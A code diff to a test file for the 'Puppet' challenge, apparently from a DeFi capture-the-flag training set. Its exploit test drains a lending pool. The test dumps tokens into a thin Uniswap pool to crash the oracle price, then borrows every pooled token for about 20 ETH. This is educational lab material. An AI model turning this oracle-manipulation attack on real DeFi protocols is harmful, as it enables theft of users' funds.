@@ -9,11 +9,7 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
 	return tokensSold
 		.mul(ethers.BigNumber.from('997'))
 		.mul(etherInReserve)
-		.div(
-			tokensInReserve
-				.mul(ethers.BigNumber.from('1000'))
-				.add(tokensSold.mul(ethers.BigNumber.from('997')))
-		)
+		.div(tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
 }
 
 describe('[Challenge] Puppet', function () {
@@ -50,9 +46,7 @@ describe('[Challenge] Puppet', function () {
 			'0x15af1d78b58c40000', // 25 ETH
 		])
 
-		expect(await ethers.provider.getBalance(attacker.address)).to.equal(
-			ATTACKER_INITIAL_ETH_BALANCE
-		)
+		expect(await ethers.provider.getBalance(attacker.address)).to.equal(ATTACKER_INITIAL_ETH_BALANCE)
 
 		// Deploy token to be traded in Uniswap
 		this.token = await DamnValuableTokenFactory.deploy()
@@ -71,10 +65,7 @@ describe('[Challenge] Puppet', function () {
 		this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange)
 
 		// Deploy the lending pool
-		this.lendingPool = await PuppetPoolFactory.deploy(
-			this.token.address,
-			this.uniswapExchange.address
-		)
+		this.lendingPool = await PuppetPoolFactory.deploy(this.token.address, this.uniswapExchange.address)
 
 		// Add initial token and ETH liquidity to the pool
 		await this.token.approve(this.uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE)
@@ -115,22 +106,38 @@ describe('[Challenge] Puppet', function () {
 
 	it('Exploit', async function () {
 		/** CODE YOUR EXPLOIT HERE */
-		const tokensSwapAmount = ethers.utils.parseEther('999')
-		const deadline = new Date().getTime() + 1000
+		const tokensToSwap = ethers.utils.parseEther('999')
+		const arbitraryDeadline = new Date().getTime() + 1000
 
-		// Approve the UniswapExchange the tokensSwapAmount
-		await this.token.connect(attacker).approve(this.uniswapExchange.address, tokensSwapAmount)
+		console.log(
+			'Value required before attack: ',
+			String(await this.lendingPool.calculateDepositRequired(tokensToSwap))
+		)
+		/**
+		 * https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy#L221
+		 * Approve and swap DVT tokens with ETH calling the Uniswap contract.
+		 * We'll give 999 DVT to the exchange, and get some ETH out of it, creating an imbalance in the
+		 * ETH/DVT ratio, which in turn will devaluate the price of DVT
+		 * FROM:
+		 * 10 ETH        /    10 DVT  =       1        * 2 =      2         wei per DVT
+		 * TO:
+		 * 0,099 ETH / 1009 DVT = 0.000098 * 2 = 0.000196 wei per DVT
+		 * And so, the collateral needed for borrowing the 100.000 DVT becomes
+		 * ~19 ETH (0.000098 * 100.000 * 2) instead of the original 200.000 ETH (1 * 100.000 * 2)
+		 */
 
-		// Execute function of Uniswap contract that allow to swap tokens with ETH.
-		// This will unbalance the ETH/DVT ratio, and devaluate the price of DVT:
-		// from [10/10 = 1] to [0,099/1009 = 0.000098]
-		// https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy
+		// Approve and swap DVT for ETH
+		await this.token.connect(attacker).approve(this.uniswapExchange.address, tokensToSwap)
 		await this.uniswapExchange
 			.connect(attacker)
-			.tokenToEthSwapInput(tokensSwapAmount, ethers.utils.parseEther('9'), deadline)
+			.tokenToEthSwapInput(tokensToSwap, ethers.utils.parseEther('9'), arbitraryDeadline)
 
-		// So, the collateral needed for borrowing the 100.000 DVT becomes
-		// ~19 ETH (0.000098 * 100.000 * 2) instead of 200.000 ETH (1 * 100.000 * 2).
+		console.log(
+			'Value required after attack: ',
+			String(await this.lendingPool.calculateDepositRequired(tokensToSwap))
+		)
+
+		//
 		await this.lendingPool
 			.connect(attacker)
 			.borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('20')})
